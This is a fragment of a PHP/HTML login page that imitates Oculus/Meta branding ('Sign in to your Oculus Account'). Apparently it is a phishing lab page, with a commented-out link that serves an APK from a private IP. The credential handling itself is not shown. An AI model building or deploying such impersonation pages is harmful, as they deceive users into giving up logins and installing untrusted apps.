...
?>
  ...
  <head>
    ...
    <link rel="icon" type="image/png" href="assets/img/oculus-logo.png"/>

    <style>

    body {
      background-image: url("assets/img/oculusback.jpg");
  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="assets/img/oculus-logo.png" alt=""></img>

        <h1 class="text-center login-title">Welcome to the MetaVerse</h1>
        <h2 class="text-center friends-text">Sign in to your Oculus Account</h2>
          ...
          <!-- Optional: Direct APK download button -->
<!--
          <a href="http://192.168.243.132/com.kalem.just1mb.apk" download>Download APK</a>
-->
